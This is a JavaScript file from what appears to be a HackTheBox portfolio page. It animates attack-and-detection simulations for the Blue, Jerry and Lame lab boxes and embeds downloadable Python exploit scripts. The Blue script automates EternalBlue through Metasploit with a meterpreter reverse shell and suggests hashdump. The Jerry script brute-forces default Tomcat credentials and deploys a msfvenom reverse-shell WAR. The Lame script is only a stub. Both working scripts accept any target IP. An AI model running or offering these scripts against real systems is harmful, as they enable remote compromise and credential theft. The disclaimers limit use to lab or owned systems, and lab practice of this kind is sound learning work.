// Exploit Simulation Scripts

// HTB Blue - EternalBlue Simulation
function simulateBlue() {
    const attackerOutput = document.getElementById('blue-attacker');
    const defenderPanel = document.getElementById('blue-defender');
    
    // Clear previous content
    attackerOutput.textContent = '';
    defenderPanel.innerHTML = '';
    
    const stages = [
        {
            delay: 0,
            attacker: '$ python3 blue_auto.py 10.10.10.40 10.10.14.31\n\n[*] Automated HTB Blue Exploitation\n[*] Target: 10.10.10.40\n[*] Attacker: 10.10.14.31\n',
            defender: null
        },
        {
            delay: 1000,
            attacker: '\n[*] Stage 1: Network Reconnaissance (T1046)\n[*] Scanning target ports...\n',
            defender: {
                severity: 'warning',
                icon: 'âš ï¸',
                title: 'Network Scan Detected',
                message: 'Source: 10.10.14.31 scanning 10.10.10.40',
                time: '00:01'
            }
        },
        {
            delay: 2500,
            attacker: '[+] Port 445 OPEN (SMB)\n[+] Port 135 OPEN (RPC)\n[+] Port 139 OPEN (NetBIOS)\n',
            defender: {
                severity: 'warning',
                icon: 'âš ï¸',
                title: 'SMB Enumeration',
                message: 'Multiple SMB service probes detected',
                time: '00:02'
            }
        },
        {
            delay: 4000,
            attacker: '\n[*] Stage 2: Vulnerability Detection\n[*] Checking for MS17-010 (EternalBlue)...\n',
            defender: {
                severity: 'info',
                icon: 'â„¹ï¸',
                title: 'Vulnerability Scan',
                message: 'MS17-010 signature detected in traffic',
                time: '00:04'
            }
        },
        {
            delay: 5500,
            attacker: '[+] Target IS VULNERABLE to MS17-010!\n[+] SMBv1 enabled\n[+] OS: Windows 7 Professional 7601 Service Pack 1\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ”´',
                title: 'CRITICAL: Exploit Attempt',
                message: 'MS17-010 (EternalBlue) exploit detected',
                time: '00:05'
            }
        },
        {
            delay: 7000,
            attacker: '\n[*] Stage 3: Payload Generation\n[*] Generating EternalBlue shellcode...\n[+] Payload: windows/x64/meterpreter/reverse_tcp\n[+] LHOST: 10.10.14.31\n[+] LPORT: 4444\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ”´',
                title: 'Malicious Payload Detected',
                message: 'Shellcode generation signatures identified',
                time: '00:07'
            }
        },
        {
            delay: 9000,
            attacker: '\n[*] Stage 4: Exploitation\n[*] Sending EternalBlue exploit...\n[*] Exploiting SMB buffer overflow...\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ”´',
                title: 'Active Exploitation',
                message: 'Buffer overflow attack in progress',
                time: '00:09'
            }
        },
        {
            delay: 11000,
            attacker: '[+] Exploit sent successfully!\n[+] Connection established!\n\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸš¨',
                title: 'BREACH: Remote Code Execution',
                message: 'Successful RCE on 10.10.10.40',
                time: '00:11'
            }
        },
        {
            delay: 12500,
            attacker: '[*] Stage 5: Post-Exploitation\n[+] Shell obtained!\n[+] User: NT AUTHORITY\\SYSTEM\n[+] Hostname: haris-PC\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸš¨',
                title: 'SYSTEM Shell Spawned',
                message: 'Highest privilege level achieved',
                time: '00:12'
            }
        },
        {
            delay: 14000,
            attacker: '\n[*] Searching for flags...\n[+] User flag: C:\\Users\\haris\\Desktop\\user.txt\n[+] Root flag: C:\\Users\\Administrator\\Desktop\\root.txt\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸš¨',
                title: 'Sensitive File Access',
                message: 'Unauthorized access to user directories',
                time: '00:14'
            }
        },
        {
            delay: 15500,
            attacker: '\n[+] â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n[+]  EXPLOITATION COMPLETE\n[+]  Total time: 15 seconds\n[+]  Access level: SYSTEM\n[+]  Box OWNED\n[+] â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ“Š',
                title: 'Incident Summary',
                message: 'Full system compromise via MS17-010. Generate incident report.',
                time: '00:15'
            }
        }
    ];
    
    // Execute stages
    stages.forEach(stage => {
        setTimeout(() => {
            // Add attacker output
            attackerOutput.textContent += stage.attacker;
            attackerOutput.scrollTop = attackerOutput.scrollHeight;
            
            // Add defender alert
            if (stage.defender) {
                const alert = createAlert(stage.defender);
                defenderPanel.appendChild(alert);
                defenderPanel.scrollTop = defenderPanel.scrollHeight;
            }
        }, stage.delay);
    });
}

// HTB Jerry - Tomcat Manager Simulation
function simulateJerry() {
    const attackerOutput = document.getElementById('jerry-attacker');
    const defenderPanel = document.getElementById('jerry-defender');
    
    attackerOutput.textContent = '';
    defenderPanel.innerHTML = '';
    
    const stages = [
        {
            delay: 0,
            attacker: '$ python3 jerry_auto.py 10.10.10.95 10.10.14.31\n\n[*] Automated HTB Jerry Exploitation\n[*] Target: 10.10.10.95\n[*] Attacker: 10.10.14.31\n',
            defender: null
        },
        {
            delay: 1000,
            attacker: '\n[*] Stage 1: Service Discovery\n[*] Scanning port 8080...\n[+] Apache Tomcat detected\n',
            defender: {
                severity: 'warning',
                icon: 'âš ï¸',
                title: 'Port Scan Detected',
                message: 'HTTP service enumeration on port 8080',
                time: '00:01'
            }
        },
        {
            delay: 2500,
            attacker: '\n[*] Stage 2: Credential Bruteforce (T1078)\n[*] Testing default credentials...\n',
            defender: {
                severity: 'warning',
                icon: 'âš ï¸',
                title: 'Bruteforce Attempt',
                message: 'Multiple login attempts to /manager',
                time: '00:02'
            }
        },
        {
            delay: 4000,
            attacker: '[+] SUCCESS! Credentials found: tomcat:s3cret\n[+] Access to Tomcat Manager granted\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ”´',
                title: 'Unauthorized Access',
                message: 'Successful login with compromised credentials',
                time: '00:04'
            }
        },
        {
            delay: 5500,
            attacker: '\n[*] Stage 3: Payload Generation\n[*] Creating malicious WAR file...\n[+] Payload: cmd.jsp reverse shell\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ”´',
                title: 'Malicious Upload Detected',
                message: 'WAR file with suspicious signatures',
                time: '00:05'
            }
        },
        {
            delay: 7000,
            attacker: '\n[*] Stage 4: Deployment (T1505.003)\n[*] Uploading WAR to /manager/html/upload...\n[+] Upload successful!\n[+] Application deployed: /shell\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸš¨',
                title: 'Web Shell Deployed',
                message: 'Malicious web application installed',
                time: '00:07'
            }
        },
        {
            delay: 8500,
            attacker: '\n[*] Stage 5: Triggering Shell\n[*] Accessing http://10.10.10.95:8080/shell/cmd.jsp\n[+] Shell obtained!\n[+] User: NT AUTHORITY\\SYSTEM\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸš¨',
                title: 'BREACH: Command Execution',
                message: 'Web shell active with SYSTEM privileges',
                time: '00:08'
            }
        },
        {
            delay: 10000,
            attacker: '\n[+] â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n[+]  EXPLOITATION COMPLETE\n[+]  Total time: 8 seconds\n[+]  Access level: SYSTEM\n[+]  Box OWNED\n[+] â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ“Š',
                title: 'Incident Summary',
                message: 'Full compromise via Tomcat Manager exploit',
                time: '00:10'
            }
        }
    ];
    
    stages.forEach(stage => {
        setTimeout(() => {
            attackerOutput.textContent += stage.attacker;
            attackerOutput.scrollTop = attackerOutput.scrollHeight;
            
            if (stage.defender) {
                const alert = createAlert(stage.defender);
                defenderPanel.appendChild(alert);
                defenderPanel.scrollTop = defenderPanel.scrollHeight;
            }
        }, stage.delay);
    });
}

// HTB Lame - vsftpd Backdoor Simulation
function simulateLame() {
    const attackerOutput = document.getElementById('lame-attacker');
    const defenderPanel = document.getElementById('lame-defender');
    
    attackerOutput.textContent = '';
    defenderPanel.innerHTML = '';
    
    const stages = [
        {
            delay: 0,
            attacker: '$ python3 lame_auto.py 10.10.10.3 10.10.14.31\n\n[*] Automated HTB Lame Exploitation\n[*] Target: 10.10.10.3\n[*] Attacker: 10.10.14.31\n',
            defender: null
        },
        {
            delay: 1000,
            attacker: '\n[*] Stage 1: Service Discovery\n[*] Scanning FTP service...\n[+] vsftpd 2.3.4 detected on port 21\n',
            defender: {
                severity: 'warning',
                icon: 'âš ï¸',
                title: 'FTP Service Probed',
                message: 'Version detection scan on port 21',
                time: '00:01'
            }
        },
        {
            delay: 2500,
            attacker: '\n[*] Stage 2: Vulnerability Check\n[*] Checking for vsftpd 2.3.4 backdoor...\n[+] Target IS VULNERABLE!\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ”´',
                title: 'Known Vulnerability Detected',
                message: 'vsftpd 2.3.4 backdoor signature found',
                time: '00:02'
            }
        },
        {
            delay: 4000,
            attacker: '\n[*] Stage 3: Triggering Backdoor\n[*] Sending malicious USER command...\n[*] Triggering smiley face backdoor (":)"...\n[+] Backdoor triggered!\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸš¨',
                title: 'Backdoor Activation',
                message: 'vsftpd backdoor triggered via USER command',
                time: '00:04'
            }
        },
        {
            delay: 5500,
            attacker: '\n[*] Stage 4: Connecting to Backdoor\n[*] Connecting to port 6200...\n[+] Connection established!\n[+] Shell obtained!\n[+] User: root\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸš¨',
                title: 'BREACH: Root Shell',
                message: 'Backdoor shell on port 6200 with root access',
                time: '00:05'
            }
        },
        {
            delay: 7000,
            attacker: '\n[+] â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n[+]  EXPLOITATION COMPLETE\n[+]  Total time: 5 seconds\n[+]  Access level: ROOT\n[+]  Box OWNED\n[+] â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n',
            defender: {
                severity: 'critical',
                icon: 'ğŸ“Š',
                title: 'Incident Summary',
                message: 'Instant root access via vsftpd backdoor',
                time: '00:07'
            }
        }
    ];
    
    stages.forEach(stage => {
        setTimeout(() => {
            attackerOutput.textContent += stage.attacker;
            attackerOutput.scrollTop = attackerOutput.scrollHeight;
            
            if (stage.defender) {
                const alert = createAlert(stage.defender);
                defenderPanel.appendChild(alert);
                defenderPanel.scrollTop = defenderPanel.scrollHeight;
            }
        }, stage.delay);
    });
}

// Helper function to create alert elements
function createAlert(config) {
    const alert = document.createElement('div');
    alert.className = `detection-alert ${config.severity}`;
    
    alert.innerHTML = `
        <div class="alert-header">
            <span class="alert-icon">${config.icon}</span>
            <span class="alert-title">${config.title}</span>
            <span class="alert-time">${config.time}</span>
        </div>
        <div class="alert-body">${config.message}</div>
    `;
    
    return alert;
}

// Download script functions
function downloadBlueScript() {
    const script = `#!/usr/bin/env python3
"""
HTB Blue - Automated EternalBlue (MS17-010) Exploitation
Author: port254
Target: HTB Blue (10.10.10.40)
Requires: Metasploit, impacket

DISCLAIMER: For authorized penetration testing only.
Use only on HackTheBox lab environment or systems you own.
"""

import sys
import os
import subprocess
import time
from pathlib import Path

def print_banner():
    banner = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     HTB Blue - Automated EternalBlue Exploitation         â•‘
â•‘              MS17-010 SMB Remote Code Execution           â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""
    print(banner)

def print_stage(stage_num, description):
    print(f"\\n[*] Stage {stage_num}: {description}")
    print("=" * 60)

def run_command(cmd, shell=False):
    """Execute command and return output"""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout, result.returncode
    except subprocess.TimeoutExpired:
        return "Command timed out", 1
    except Exception as e:
        return str(e), 1

def check_dependencies():
    """Check if required tools are installed"""
    print("[*] Checking dependencies...")
    
    tools = {
        'nmap': 'nmap --version',
        'msfconsole': 'which msfconsole',
    }
    
    missing = []
    for tool, check_cmd in tools.items():
        output, returncode = run_command(check_cmd, shell=True)
        if returncode != 0:
            missing.append(tool)
            print(f"[!] Missing: {tool}")
        else:
            print(f"[+] Found: {tool}")
    
    if missing:
        print(f"\\n[!] Missing tools: {', '.join(missing)}")
        print("[!] Install with: apt install metasploit-framework nmap")
        return False
    
    print("[+] All dependencies satisfied\\n")
    return True

def scan_target(target_ip):
    """Stage 1: Port scanning"""
    print_stage(1, "Network Reconnaissance")
    
    print(f"[*] Scanning target: {target_ip}")
    cmd = f"nmap -p 445,139,135 -sV {target_ip}"
    
    output, returncode = run_command(cmd, shell=True)
    
    if "445/tcp open" in output:
        print("[+] Port 445 (SMB) is OPEN")
        print("[+] Port 139 (NetBIOS) detected")
        return True
    else:
        print("[!] Port 445 is closed or filtered")
        return False

def check_vulnerability(target_ip):
    """Stage 2: Check for MS17-010 vulnerability"""
    print_stage(2, "Vulnerability Detection")
    
    print("[*] Checking for MS17-010 (EternalBlue)...")
    
    # Use Metasploit auxiliary scanner
    rc_file = "/tmp/blue_scan.rc"
    with open(rc_file, 'w') as f:
        f.write(f"""use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS {target_ip}
run
exit
""")
    
    cmd = f"msfconsole -q -r {rc_file}"
    output, returncode = run_command(cmd, shell=True)
    
    if "Host is likely VULNERABLE to MS17-010" in output:
        print("[+] Target IS VULNERABLE to MS17-010!")
        print("[+] SMBv1 enabled")
        os.remove(rc_file)
        return True
    else:
        print("[!] Target does not appear vulnerable")
        os.remove(rc_file)
        return False

def exploit_target(target_ip, lhost):
    """Stage 3-5: Exploit and post-exploitation"""
    print_stage(3, "Payload Generation & Exploitation")
    
    print(f"[*] Target: {target_ip}")
    print(f"[*] Listener: {lhost}:4444")
    print("[*] Payload: windows/x64/meterpreter/reverse_tcp")
    
    # Create Metasploit resource script
    rc_file = "/tmp/blue_exploit.rc"
    with open(rc_file, 'w') as f:
        f.write(f"""use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target_ip}
set LHOST {lhost}
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
exploit -j -z
""")
    
    print("\\n[*] Launching EternalBlue exploit...")
    print("[*] This may take 30-60 seconds...")
    print("[*] Sending SMB packets...")
    
    # Run exploit
    cmd = f"msfconsole -q -r {rc_file}"
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    
    # Wait for exploitation
    time.sleep(45)
    
    print("\\n[+] Exploit attempt completed!")
    print("[+] If successful, you should have a Meterpreter session")
    
    print_stage(4, "Post-Exploitation Commands")
    print("""
[*] From meterpreter prompt, try these commands:

    getuid              # Check current user (should be NT AUTHORITY\\\\SYSTEM)
    sysinfo             # Get system information
    hashdump            # Dump password hashes
    shell               # Drop to Windows shell
    
    # Flag hunting:
    cd C:\\\\Users\\\\haris\\\\Desktop
    cat user.txt
    
    cd C:\\\\Users\\\\Administrator\\\\Desktop
    cat root.txt
""")
    
    print("[*] Metasploit console will open with your session...")
    print("[*] Press Ctrl+C to background session, 'sessions -i 1' to interact")
    
    os.remove(rc_file)
    
    # Keep console open for interaction
    os.system("msfconsole -q -x 'sessions -l'")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 blue_auto.py <target_ip> <your_ip>")
        print("Example: python3 blue_auto.py 10.10.10.40 10.10.14.31")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    lhost = sys.argv[2]
    
    print_banner()
    
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Attacker IP: {lhost}")
    print(f"[*] Started at: {time.strftime('%Y-%m-%d %H:%M:%S')}\\n")
    
    # Check dependencies
    if not check_dependencies():
        sys.exit(1)
    
    # Stage 1: Scan
    if not scan_target(target_ip):
        print("\\n[!] Target is not reachable or SMB is not open")
        sys.exit(1)
    
    # Stage 2: Vulnerability check
    if not check_vulnerability(target_ip):
        print("\\n[!] Target is not vulnerable to MS17-010")
        sys.exit(1)
    
    # Stage 3-5: Exploit
    exploit_target(target_ip, lhost)
    
    print("\\n[+] Exploitation script completed!")
    print("[+] Check Metasploit console for active sessions")
    print(f"[+] Finished at: {time.strftime('%Y-%m-%d %H:%M:%S')}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\\n\\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\\n[!] Error: {str(e)}")
        sys.exit(1)
`;
    
    downloadFile('blue_auto.py', script);
}

function downloadJerryScript() {
    const script = `#!/usr/bin/env python3
"""
HTB Jerry - Automated Tomcat Manager Exploitation
Author: port254
Target: HTB Jerry (10.10.10.95)
Requires: msfvenom, curl

DISCLAIMER: For authorized penetration testing only.
Use only on HackTheBox lab environment or systems you own.
"""

import sys
import os
import subprocess
import time
import requests
from requests.auth import HTTPBasicAuth

def print_banner():
    banner = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     HTB Jerry - Automated Tomcat Exploitation             â•‘
â•‘         Default Credentials + Malicious WAR Upload        â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""
    print(banner)

def print_stage(stage_num, description):
    print(f"\\n[*] Stage {stage_num}: {description}")
    print("=" * 60)

def run_command(cmd, shell=False):
    """Execute command and return output"""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout, result.returncode
    except subprocess.TimeoutExpired:
        return "Command timed out", 1
    except Exception as e:
        return str(e), 1

def check_dependencies():
    """Check if required tools are installed"""
    print("[*] Checking dependencies...")
    
    tools = {
        'msfvenom': 'which msfvenom',
        'curl': 'which curl',
    }
    
    missing = []
    for tool, check_cmd in tools.items():
        output, returncode = run_command(check_cmd, shell=True)
        if returncode != 0:
            missing.append(tool)
            print(f"[!] Missing: {tool}")
        else:
            print(f"[+] Found: {tool}")
    
    if missing:
        print(f"\\n[!] Missing tools: {', '.join(missing)}")
        print("[!] Install with: apt install metasploit-framework curl")
        return False
    
    print("[+] All dependencies satisfied\\n")
    return True

def scan_target(target_ip):
    """Stage 1: Service Discovery"""
    print_stage(1, "Service Discovery")
    
    print(f"[*] Scanning target: {target_ip}:8080")
    
    try:
        response = requests.get(f"http://{target_ip}:8080", timeout=5)
        if "Tomcat" in response.text:
            print("[+] Apache Tomcat detected on port 8080")
            if "7.0.88" in response.text:
                print("[+] Version: Apache Tomcat 7.0.88")
            return True
        else:
            print("[!] No Tomcat service detected")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Cannot connect to target: {e}")
        return False

def test_credentials(target_ip):
    """Stage 2: Credential Testing"""
    print_stage(2, "Credential Bruteforce")
    
    print("[*] Testing default Tomcat credentials...")
    
    # Common Tomcat default credentials
    credentials = [
        ('tomcat', 's3cret'),
        ('tomcat', 'tomcat'),
        ('admin', 'admin'),
        ('admin', 'tomcat'),
    ]
    
    for username, password in credentials:
        print(f"[*] Trying: {username}:{password}")
        
        try:
            url = f"http://{target_ip}:8080/manager/html"
            response = requests.get(
                url,
                auth=HTTPBasicAuth(username, password),
                timeout=5
            )
            
            if response.status_code == 200:
                print(f"[+] SUCCESS! Valid credentials: {username}:{password}")
                return username, password
            else:
                print(f"[-] Failed: {username}:{password}")
        
        except requests.exceptions.RequestException:
            continue
    
    print("[!] No valid credentials found")
    return None, None

def generate_payload(lhost, lport):
    """Stage 3: Payload Generation"""
    print_stage(3, "Malicious WAR Payload Generation")
    
    print(f"[*] Generating reverse shell WAR file...")
    print(f"[*] LHOST: {lhost}")
    print(f"[*] LPORT: {lport}")
    
    war_file = "/tmp/exploit.war"
    
    # Generate WAR payload with msfvenom
    cmd = f"msfvenom -p java/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o {war_file}"
    
    print("[*] Running msfvenom...")
    output, returncode = run_command(cmd, shell=True)
    
    if returncode == 0 and os.path.exists(war_file):
        print(f"[+] WAR payload generated: {war_file}")
        print(f"[+] Payload type: java/shell_reverse_tcp")
        return war_file
    else:
        print("[!] Failed to generate payload")
        return None

def upload_war(target_ip, username, password, war_file):
    """Stage 4: WAR Upload & Deployment"""
    print_stage(4, "WAR File Upload")
    
    print("[*] Uploading malicious WAR to Tomcat Manager...")
    
    url = f"http://{target_ip}:8080/manager/text/deploy?path=/exploit"
    
    try:
        with open(war_file, 'rb') as f:
            response = requests.put(
                url,
                auth=HTTPBasicAuth(username, password),
                data=f,
                headers={'Content-Type': 'application/octet-stream'},
                timeout=10
            )
        
        if "OK" in response.text:
            print("[+] WAR file uploaded successfully!")
            print("[+] Application deployed at: /exploit")
            return True
        else:
            print(f"[!] Upload failed: {response.text}")
            return False
    
    except Exception as e:
        print(f"[!] Upload error: {e}")
        return False

def trigger_shell(target_ip, lhost, lport):
    """Stage 5: Trigger Reverse Shell"""
    print_stage(5, "Triggering Reverse Shell")
    
    print(f"[*] Starting listener on {lhost}:{lport}")
    print(f"[*] In another terminal, run:")
    print(f"    nc -nlvp {lport}")
    print()
    
    input("[*] Press ENTER when listener is ready...")
    
    print("\\n[*] Triggering reverse shell...")
    print(f"[*] Accessing: http://{target_ip}:8080/exploit/")
    
    try:
        # Trigger the WAR (will hang if successful)
        requests.get(f"http://{target_ip}:8080/exploit/", timeout=5)
    except requests.exceptions.Timeout:
        print("[+] Connection timed out (shell likely connected!)")
        pass
    except Exception as e:
        print(f"[*] Trigger sent: {e}")
    
    print("\\n[+] Shell should be connected!")
    print("[+] Check your netcat listener")
    print()
    print("[*] Post-Exploitation Commands:")
    print("=" * 60)
    print("""
    whoami                          # Should show: NT AUTHORITY\\\\SYSTEM
    systeminfo                      # Get system information
    
    # Navigate to flags:
    cd C:\\\\Users\\\\Administrator\\\\Desktop\\\\flags
    type "2 for the price of 1.txt"
    
    # Or search for flags:
    cd \\\\
    dir /s /b user.txt
    dir /s /b root.txt
""")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 jerry_auto.py <target_ip> <your_ip>")
        print("Example: python3 jerry_auto.py 10.10.10.95 10.10.14.4")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    lhost = sys.argv[2]
    lport = 443  # Default port
    
    print_banner()
    
    print(f"[*] Target IP: {target_ip}")
    print(f"[*] Attacker IP: {lhost}")
    print(f"[*] Listener Port: {lport}")
    print(f"[*] Started at: {time.strftime('%Y-%m-%d %H:%M:%S')}\\n")
    
    # Check dependencies
    if not check_dependencies():
        sys.exit(1)
    
    # Stage 1: Scan
    if not scan_target(target_ip):
        print("\\n[!] Target is not reachable or Tomcat not detected")
        sys.exit(1)
    
    # Stage 2: Test credentials
    username, password = test_credentials(target_ip)
    if not username:
        print("\\n[!] Could not find valid credentials")
        sys.exit(1)
    
    # Stage 3: Generate payload
    war_file = generate_payload(lhost, lport)
    if not war_file:
        sys.exit(1)
    
    # Stage 4: Upload WAR
    if not upload_war(target_ip, username, password, war_file):
        sys.exit(1)
    
    # Stage 5: Trigger shell
    trigger_shell(target_ip, lhost, lport)
    
    # Cleanup
    if os.path.exists(war_file):
        os.remove(war_file)
        print(f"[*] Cleaned up: {war_file}")
    
    print("\\n[+] Exploitation script completed!")
    print(f"[+] Finished at: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print("\\n[*] Note: You already have SYSTEM privileges from the Tomcat service!")
    print("[*] No privilege escalation needed for Jerry box.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\\n\\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\\n[!] Error: {str(e)}")
        sys.exit(1)
`;
    
    downloadFile('jerry_auto.py', script);
}

function downloadLameScript() {
    const script = `#!/usr/bin/env python3
"""
HTB Lame - Automated vsftpd 2.3.4 Backdoor Exploitation
Author: port254
Target: HTB Lame (10.10.10.3)
"""

import sys
import socket

def exploit_lame(target_ip, attacker_ip):
    print("[*] Automated HTB Lame Exploitation")
    print(f"[*] Target: {target_ip}")
    print(f"[*] Attacker: {attacker_ip}")
    
    # Stage 1: Trigger backdoor
    print("\\n[*] Triggering vsftpd backdoor...")
    # ... (Add your backdoor trigger logic)
    
    # Stage 2: Connect to backdoor
    print("[*] Connecting to backdoor port 6200...")
    # ... (Add your connection logic)
    
    print("[+] Exploitation complete!")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 lame_auto.py <target_ip> <attacker_ip>")
        sys.exit(1)
    
    exploit_lame(sys.argv[1], sys.argv[2])
`;
    
    downloadFile('lame_auto.py', script);
}

// Helper function to download files
function downloadFile(filename, content) {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}
